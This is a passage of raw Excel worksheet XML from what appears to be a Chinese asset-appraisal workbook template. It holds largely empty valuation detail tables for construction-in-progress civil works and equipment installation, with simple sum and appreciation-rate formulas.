      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="347" t="n"/>
      <c r="J22" s="347" t="n"/>
      <c r="K22" s="156" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B23" s="284" t="n"/>
      <c r="C23" s="284" t="n"/>
      <c r="D23" s="200" t="n"/>
      <c r="E23" s="555" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="347" t="n"/>
      <c r="J23" s="347" t="n"/>
      <c r="K23" s="156" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B24" s="284" t="n"/>
      <c r="C24" s="284" t="n"/>
      <c r="D24" s="201" t="n"/>
      <c r="E24" s="555" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="347" t="n"/>
      <c r="J24" s="347" t="n"/>
      <c r="K24" s="156" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="148" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B25" s="145" t="n"/>
      <c r="C25" s="202" t="inlineStr">
        <is>
          <t>在建汇总</t>
        </is>
      </c>
      <c r="D25" s="284" t="inlineStr">
        <is>
          <t>合           计</t>
        </is>
      </c>
      <c r="E25" s="555">
        <f>SUM(E6:E24)</f>
        <v/>
      </c>
      <c r="F25" s="555">
        <f>SUM(F6:F24)</f>
        <v/>
      </c>
      <c r="G25" s="555">
        <f>F25-E25</f>
        <v/>
      </c>
      <c r="H25" s="555">
        <f>IF(E25=0,"",G25/E25*100)</f>
        <v/>
      </c>
      <c r="I25" s="347" t="n"/>
      <c r="J25" s="347" t="n"/>
      <c r="K25" s="156" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="B1:H1"/>
    <mergeCell ref="B2:H2"/>
    <mergeCell ref="B4:E4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67.xml><?xml version="1.0" encoding="utf-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetPr codeName="Sheet64">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:N29"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A26"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="5.33333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col width="15.3333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="9" customWidth="1" style="410" min="4" max="4"/>
    <col width="13" customWidth="1" style="410" min="5" max="5"/>
    <col width="11" customWidth="1" style="410" min="6" max="6"/>
    <col width="12.1666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col width="9" customWidth="1" style="410" min="8" max="9"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="10" max="10"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="11" max="12"/>
    <col outlineLevel="1" width="9" customWidth="1" style="410" min="13" max="13"/>
    <col width="8.83333333333333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在建工程—土建工程评估明细表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373" t="n"/>
      <c r="G3" s="373" t="n"/>
      <c r="H3" s="373" t="n"/>
      <c r="I3" s="373" t="n"/>
      <c r="J3" s="373" t="n"/>
      <c r="K3" s="373" t="n"/>
      <c r="L3" s="373" t="n"/>
      <c r="M3" s="373" t="n"/>
      <c r="N3" s="402" t="inlineStr">
        <is>
          <t>表4-9-1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项目名称</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>结构</t>
        </is>
      </c>
      <c r="E5" s="195" t="inlineStr">
        <is>
          <t>建筑面积/容积</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>开工日期</t>
        </is>
      </c>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>预计完工日期</t>
        </is>
      </c>
      <c r="H5" s="380" t="inlineStr">
        <is>
          <t>形象进度</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>付款比例</t>
        </is>
      </c>
      <c r="J5" s="552" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="K5" s="552" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="L5" s="552" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="M5" s="552" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="N5" s="380" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="180" t="n"/>
      <c r="D6" s="196" t="n"/>
      <c r="E6" s="197" t="n"/>
      <c r="F6" s="587" t="n"/>
      <c r="G6" s="587" t="n"/>
      <c r="H6" s="380" t="n"/>
      <c r="I6" s="380" t="n"/>
      <c r="J6" s="555" t="n"/>
      <c r="K6" s="555" t="n"/>
      <c r="L6" s="555">
        <f>K6-J6</f>
        <v/>
      </c>
      <c r="M6" s="555">
        <f>IF(J6=0,"",L6/J6*100)</f>
        <v/>
      </c>
      <c r="N6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="180" t="n"/>
      <c r="D7" s="381" t="n"/>
      <c r="E7" s="381" t="n"/>
      <c r="F7" s="587" t="n"/>
      <c r="G7" s="587" t="n"/>
      <c r="H7" s="380" t="n"/>
      <c r="I7" s="380" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555" t="n"/>
      <c r="L7" s="555">
        <f>K7-J7</f>
        <v/>
      </c>
      <c r="M7" s="555">
        <f>IF(J7=0,"",L7/J7*100)</f>
        <v/>
      </c>
      <c r="N7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="180" t="n"/>
      <c r="D8" s="381" t="n"/>
      <c r="E8" s="381" t="n"/>
      <c r="F8" s="587" t="n"/>
      <c r="G8" s="587" t="n"/>
      <c r="H8" s="380" t="n"/>
      <c r="I8" s="380" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555" t="n"/>
      <c r="L8" s="555">
        <f>K8-J8</f>
        <v/>
      </c>
      <c r="M8" s="555">
        <f>IF(J8=0,"",L8/J8*100)</f>
        <v/>
      </c>
      <c r="N8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="381" t="n"/>
      <c r="E9" s="381" t="n"/>
      <c r="F9" s="587" t="n"/>
      <c r="G9" s="587" t="n"/>
      <c r="H9" s="380" t="n"/>
      <c r="I9" s="380" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555" t="n"/>
      <c r="L9" s="555">
        <f>K9-J9</f>
        <v/>
      </c>
      <c r="M9" s="555">
        <f>IF(J9=0,"",L9/J9*100)</f>
        <v/>
      </c>
      <c r="N9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="381" t="n"/>
      <c r="E10" s="381" t="n"/>
      <c r="F10" s="587" t="n"/>
      <c r="G10" s="587" t="n"/>
      <c r="H10" s="380" t="n"/>
      <c r="I10" s="380" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555" t="n"/>
      <c r="L10" s="555">
        <f>K10-J10</f>
        <v/>
      </c>
      <c r="M10" s="555">
        <f>IF(J10=0,"",L10/J10*100)</f>
        <v/>
      </c>
      <c r="N10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="381" t="n"/>
      <c r="E11" s="381" t="n"/>
      <c r="F11" s="587" t="n"/>
      <c r="G11" s="587" t="n"/>
      <c r="H11" s="380" t="n"/>
      <c r="I11" s="380" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555" t="n"/>
      <c r="L11" s="555">
        <f>K11-J11</f>
        <v/>
      </c>
      <c r="M11" s="555">
        <f>IF(J11=0,"",L11/J11*100)</f>
        <v/>
      </c>
      <c r="N11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="381" t="n"/>
      <c r="E12" s="381" t="n"/>
      <c r="F12" s="587" t="n"/>
      <c r="G12" s="587" t="n"/>
      <c r="H12" s="380" t="n"/>
      <c r="I12" s="380" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555" t="n"/>
      <c r="L12" s="555">
        <f>K12-J12</f>
        <v/>
      </c>
      <c r="M12" s="555">
        <f>IF(J12=0,"",L12/J12*100)</f>
        <v/>
      </c>
      <c r="N12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="381" t="n"/>
      <c r="E13" s="381" t="n"/>
      <c r="F13" s="587" t="n"/>
      <c r="G13" s="587" t="n"/>
      <c r="H13" s="380" t="n"/>
      <c r="I13" s="380" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555" t="n"/>
      <c r="L13" s="555">
        <f>K13-J13</f>
        <v/>
      </c>
      <c r="M13" s="555">
        <f>IF(J13=0,"",L13/J13*100)</f>
        <v/>
      </c>
      <c r="N13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="381" t="n"/>
      <c r="E14" s="381" t="n"/>
      <c r="F14" s="587" t="n"/>
      <c r="G14" s="587" t="n"/>
      <c r="H14" s="380" t="n"/>
      <c r="I14" s="380" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555" t="n"/>
      <c r="L14" s="555">
        <f>K14-J14</f>
        <v/>
      </c>
      <c r="M14" s="555">
        <f>IF(J14=0,"",L14/J14*100)</f>
        <v/>
      </c>
      <c r="N14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="381" t="n"/>
      <c r="E15" s="381" t="n"/>
      <c r="F15" s="587" t="n"/>
      <c r="G15" s="587" t="n"/>
      <c r="H15" s="380" t="n"/>
      <c r="I15" s="380" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555" t="n"/>
      <c r="L15" s="555">
        <f>K15-J15</f>
        <v/>
      </c>
      <c r="M15" s="555">
        <f>IF(J15=0,"",L15/J15*100)</f>
        <v/>
      </c>
      <c r="N15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="381" t="n"/>
      <c r="E16" s="381" t="n"/>
      <c r="F16" s="587" t="n"/>
      <c r="G16" s="587" t="n"/>
      <c r="H16" s="380" t="n"/>
      <c r="I16" s="380" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555" t="n"/>
      <c r="L16" s="555">
        <f>K16-J16</f>
        <v/>
      </c>
      <c r="M16" s="555">
        <f>IF(J16=0,"",L16/J16*100)</f>
        <v/>
      </c>
      <c r="N16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="381" t="n"/>
      <c r="E17" s="381" t="n"/>
      <c r="F17" s="587" t="n"/>
      <c r="G17" s="587" t="n"/>
      <c r="H17" s="380" t="n"/>
      <c r="I17" s="380" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555" t="n"/>
      <c r="L17" s="555">
        <f>K17-J17</f>
        <v/>
      </c>
      <c r="M17" s="555">
        <f>IF(J17=0,"",L17/J17*100)</f>
        <v/>
      </c>
      <c r="N17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="381" t="n"/>
      <c r="E18" s="381" t="n"/>
      <c r="F18" s="587" t="n"/>
      <c r="G18" s="587" t="n"/>
      <c r="H18" s="380" t="n"/>
      <c r="I18" s="380" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555" t="n"/>
      <c r="L18" s="555">
        <f>K18-J18</f>
        <v/>
      </c>
      <c r="M18" s="555">
        <f>IF(J18=0,"",L18/J18*100)</f>
        <v/>
      </c>
      <c r="N18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="381" t="n"/>
      <c r="E19" s="381" t="n"/>
      <c r="F19" s="587" t="n"/>
      <c r="G19" s="587" t="n"/>
      <c r="H19" s="380" t="n"/>
      <c r="I19" s="380" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555" t="n"/>
      <c r="L19" s="555">
        <f>K19-J19</f>
        <v/>
      </c>
      <c r="M19" s="555">
        <f>IF(J19=0,"",L19/J19*100)</f>
        <v/>
      </c>
      <c r="N19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="381" t="n"/>
      <c r="E20" s="381" t="n"/>
      <c r="F20" s="587" t="n"/>
      <c r="G20" s="587" t="n"/>
      <c r="H20" s="380" t="n"/>
      <c r="I20" s="380" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555" t="n"/>
      <c r="L20" s="555">
        <f>K20-J20</f>
        <v/>
      </c>
      <c r="M20" s="555">
        <f>IF(J20=0,"",L20/J20*100)</f>
        <v/>
      </c>
      <c r="N20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="381" t="n"/>
      <c r="E21" s="381" t="n"/>
      <c r="F21" s="587" t="n"/>
      <c r="G21" s="587" t="n"/>
      <c r="H21" s="380" t="n"/>
      <c r="I21" s="380" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555" t="n"/>
      <c r="L21" s="555">
        <f>K21-J21</f>
        <v/>
      </c>
      <c r="M21" s="555">
        <f>IF(J21=0,"",L21/J21*100)</f>
        <v/>
      </c>
      <c r="N21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="381" t="n"/>
      <c r="E22" s="381" t="n"/>
      <c r="F22" s="587" t="n"/>
      <c r="G22" s="587" t="n"/>
      <c r="H22" s="380" t="n"/>
      <c r="I22" s="380" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555" t="n"/>
      <c r="L22" s="555">
        <f>K22-J22</f>
        <v/>
      </c>
      <c r="M22" s="555">
        <f>IF(J22=0,"",L22/J22*100)</f>
        <v/>
      </c>
      <c r="N22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="381" t="n"/>
      <c r="E23" s="381" t="n"/>
      <c r="F23" s="587" t="n"/>
      <c r="G23" s="587" t="n"/>
      <c r="H23" s="380" t="n"/>
      <c r="I23" s="380" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555" t="n"/>
      <c r="L23" s="555">
        <f>K23-J23</f>
        <v/>
      </c>
      <c r="M23" s="555">
        <f>IF(J23=0,"",L23/J23*100)</f>
        <v/>
      </c>
      <c r="N23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="381" t="n"/>
      <c r="E24" s="381" t="n"/>
      <c r="F24" s="587" t="n"/>
      <c r="G24" s="587" t="n"/>
      <c r="H24" s="380" t="n"/>
      <c r="I24" s="380" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555" t="n"/>
      <c r="L24" s="555">
        <f>K24-J24</f>
        <v/>
      </c>
      <c r="M24" s="555">
        <f>IF(J24=0,"",L24/J24*100)</f>
        <v/>
      </c>
      <c r="N24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="381" t="n"/>
      <c r="E25" s="381" t="n"/>
      <c r="F25" s="587" t="n"/>
      <c r="G25" s="587" t="n"/>
      <c r="H25" s="380" t="n"/>
      <c r="I25" s="380" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555" t="n"/>
      <c r="L25" s="555">
        <f>K25-J25</f>
        <v/>
      </c>
      <c r="M25" s="555">
        <f>IF(J25=0,"",L25/J25*100)</f>
        <v/>
      </c>
      <c r="N25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="381" t="n"/>
      <c r="E26" s="381" t="n"/>
      <c r="F26" s="587" t="n"/>
      <c r="G26" s="587" t="n"/>
      <c r="H26" s="380" t="n"/>
      <c r="I26" s="380" t="n"/>
      <c r="J26" s="555" t="n"/>
      <c r="K26" s="555" t="n"/>
      <c r="L26" s="555">
        <f>K26-J26</f>
        <v/>
      </c>
      <c r="M26" s="555">
        <f>IF(J26=0,"",L26/J26*100)</f>
        <v/>
      </c>
      <c r="N26" s="383" t="n"/>
    </row>
    <row r="27" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B27" s="284" t="inlineStr">
        <is>
          <t>合      计</t>
        </is>
      </c>
      <c r="C27" s="593" t="n"/>
      <c r="D27" s="567" t="n"/>
      <c r="E27" s="555">
        <f>SUM(E6:E26)</f>
        <v/>
      </c>
      <c r="F27" s="565" t="n"/>
      <c r="G27" s="565" t="inlineStr"/>
      <c r="H27" s="383" t="n"/>
      <c r="I27" s="383" t="n"/>
      <c r="J27" s="555">
        <f>SUM(J6:J26)</f>
        <v/>
      </c>
      <c r="K27" s="555">
        <f>SUM(K6:K26)</f>
        <v/>
      </c>
      <c r="L27" s="555">
        <f>K27-J27</f>
        <v/>
      </c>
      <c r="M27" s="555">
        <f>IF(J27=0,"",L27/J27*100)</f>
        <v/>
      </c>
      <c r="N27" s="383" t="n"/>
    </row>
    <row r="28" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B28" s="284" t="inlineStr">
        <is>
          <t>减：在建土建工程减值准备</t>
        </is>
      </c>
      <c r="C28" s="593" t="n"/>
      <c r="D28" s="567" t="n"/>
      <c r="E28" s="555" t="n"/>
      <c r="F28" s="565" t="n"/>
      <c r="G28" s="565" t="inlineStr"/>
      <c r="H28" s="383" t="n"/>
      <c r="I28" s="383" t="n"/>
      <c r="J28" s="555" t="n"/>
      <c r="K28" s="555" t="n"/>
      <c r="L28" s="555">
        <f>K28-J28</f>
        <v/>
      </c>
      <c r="M28" s="555">
        <f>IF(J28=0,"",L28/J28*100)</f>
        <v/>
      </c>
      <c r="N28" s="383" t="n"/>
    </row>
    <row r="29" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A29" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B29" s="284" t="inlineStr">
        <is>
          <t>合      计</t>
        </is>
      </c>
      <c r="C29" s="593" t="n"/>
      <c r="D29" s="567" t="n"/>
      <c r="E29" s="555">
        <f>E27-E28</f>
        <v/>
      </c>
      <c r="F29" s="565" t="n"/>
      <c r="G29" s="565" t="inlineStr"/>
      <c r="H29" s="383" t="n"/>
      <c r="I29" s="383" t="n"/>
      <c r="J29" s="555">
        <f>J27-J28</f>
        <v/>
      </c>
      <c r="K29" s="555">
        <f>K27-K28</f>
        <v/>
      </c>
      <c r="L29" s="555">
        <f>K29-J29</f>
        <v/>
      </c>
      <c r="M29" s="555">
        <f>IF(J29=0,"",L29/J29*100)</f>
        <v/>
      </c>
      <c r="N29" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="6">
    <mergeCell ref="B28:D28"/>
    <mergeCell ref="B4:E4"/>
    <mergeCell ref="B1:N1"/>
    <mergeCell ref="B27:D27"/>
    <mergeCell ref="B29:D29"/>
    <mergeCell ref="B2:N2"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:N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4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 codeName="Sheet65">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:S29"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A7" sqref="A7:A26"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="9.83333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col width="11.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="9.83333333333333" customWidth="1" style="410" min="4" max="4"/>
    <col width="5" customWidth="1" style="410" min="5" max="5"/>
    <col width="5.33333333333333" customWidth="1" style="410" min="6" max="6"/>
    <col width="8.33333333333333" customWidth="1" style="410" min="7" max="7"/>
    <col width="7.33333333333333" customWidth="1" style="410" min="8" max="8"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="9" max="12"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="13" max="17"/>
    <col outlineLevel="1" width="8" customWidth="1" style="410" min="18" max="18"/>
    <col width="8.16666666666667" customWidth="1" style="410" min="19" max="19"/>
    <col width="9" customWidth="1" style="410" min="2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在建工程—设备安装工程评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" customFormat="1" s="116">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" customForma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7" t="n"/>
      <c r="L3" s="373" t="n"/>
      <c r="M3" s="373" t="n"/>
      <c r="N3" s="373" t="n"/>
      <c r="O3" s="373" t="n"/>
      <c r="P3" s="373" t="n"/>
      <c r="Q3" s="369" t="n"/>
      <c r="R3" s="369" t="n"/>
      <c r="S3" s="291" t="inlineStr">
        <is>
          <t>表4-9-2</t>
        </is>
      </c>
    </row>
    <row r="4" customForma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376" t="n"/>
      <c r="P4" s="376" t="n"/>
      <c r="S4" s="291">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" customFormat="1" s="369">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>检索表头1</t>
        </is>
      </c>
      <c r="B5" s="380" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C5" s="380" t="inlineStr">
        <is>
          <t>项目名称</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>规格型号</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>数量</t>
        </is>
      </c>
      <c r="F5" s="272" t="inlineStr">
        <is>
          <t>计量
单位</t>
        </is>
      </c>
      <c r="G5" s="272" t="inlineStr">
        <is>
          <t>开工
日期</t>
        </is>
      </c>
      <c r="H5" s="272" t="inlineStr">
        <is>
          <t>预计完
工日期</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="J5" s="593" t="n"/>
      <c r="K5" s="593" t="n"/>
      <c r="L5" s="567" t="n"/>
      <c r="M5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="N5" s="593" t="n"/>
      <c r="O5" s="593" t="n"/>
      <c r="P5" s="567" t="n"/>
      <c r="Q5" s="185" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="R5" s="264" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="S5" s="264" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.8" customFormat="1" customHeight="1" s="369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380" t="inlineStr">
        <is>
          <t>设备费</t>
        </is>
      </c>
      <c r="J6" s="380" t="inlineStr">
        <is>
          <t>资金成本</t>
        </is>
      </c>
      <c r="K6" s="380" t="inlineStr">
        <is>
          <t>安装费及其他</t>
        </is>
      </c>
      <c r="L6" s="380" t="inlineStr">
        <is>
          <t>合计</t>
        </is>
      </c>
      <c r="M6" s="380" t="inlineStr">
        <is>
          <t>设备费</t>
        </is>
      </c>
      <c r="N6" s="380" t="inlineStr">
        <is>
          <t>资金成本</t>
        </is>
      </c>
      <c r="O6" s="380" t="inlineStr">
        <is>
          <t>安装费及其他</t>
        </is>
      </c>
      <c r="P6" s="380" t="inlineStr">
        <is>
          <t>合计</t>
        </is>
      </c>
      <c r="Q6" s="594" t="n"/>
      <c r="R6" s="594" t="n"/>
      <c r="S6" s="594" t="n"/>
    </row>
    <row r="7" customFormat="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="180" t="n"/>
      <c r="D7" s="381" t="n"/>
      <c r="E7" s="381" t="n"/>
      <c r="F7" s="381" t="n"/>
      <c r="G7" s="587" t="n"/>
      <c r="H7" s="587" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555" t="n"/>
      <c r="L7" s="555">
        <f>SUM(I7:K7)</f>
        <v/>
      </c>
      <c r="M7" s="555" t="n"/>
      <c r="N7" s="555" t="n"/>
      <c r="O7" s="555">
        <f>K7*2</f>
        <v/>
      </c>
      <c r="P7" s="555">
        <f>SUM(M7:O7)</f>
        <v/>
      </c>
      <c r="Q7" s="555">
        <f>P7-L7</f>
        <v/>
      </c>
      <c r="R7" s="555">
        <f>IF(L7=0,"",Q7/L7*100)</f>
        <v/>
      </c>
      <c r="S7" s="192" t="n"/>
    </row>
    <row r="8" customFormat="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="180" t="n"/>
      <c r="D8" s="381" t="n"/>
      <c r="E8" s="381" t="n"/>
      <c r="F8" s="381" t="n"/>
      <c r="G8" s="587" t="n"/>
      <c r="H8" s="587" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555" t="n"/>
      <c r="L8" s="555">
        <f>SUM(I8:K8)</f>
        <v/>
      </c>
      <c r="M8" s="555" t="n"/>
      <c r="N8" s="555" t="n"/>
      <c r="O8" s="555" t="n"/>
      <c r="P8" s="555">
        <f>SUM(M8:O8)</f>
        <v/>
      </c>
      <c r="Q8" s="555">
        <f>P8-L8</f>
        <v/>
      </c>
      <c r="R8" s="555">
        <f>IF(L8=0,"",Q8/L8*100)</f>
        <v/>
      </c>
      <c r="S8" s="192" t="n"/>
    </row>
    <row r="9" customFormat="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="180" t="n"/>
      <c r="D9" s="381" t="n"/>
      <c r="E9" s="381" t="n"/>
      <c r="F9" s="381" t="n"/>
      <c r="G9" s="587" t="n"/>
      <c r="H9" s="587" t="n"/>
      <c r="I9" s="555" t="n"/>
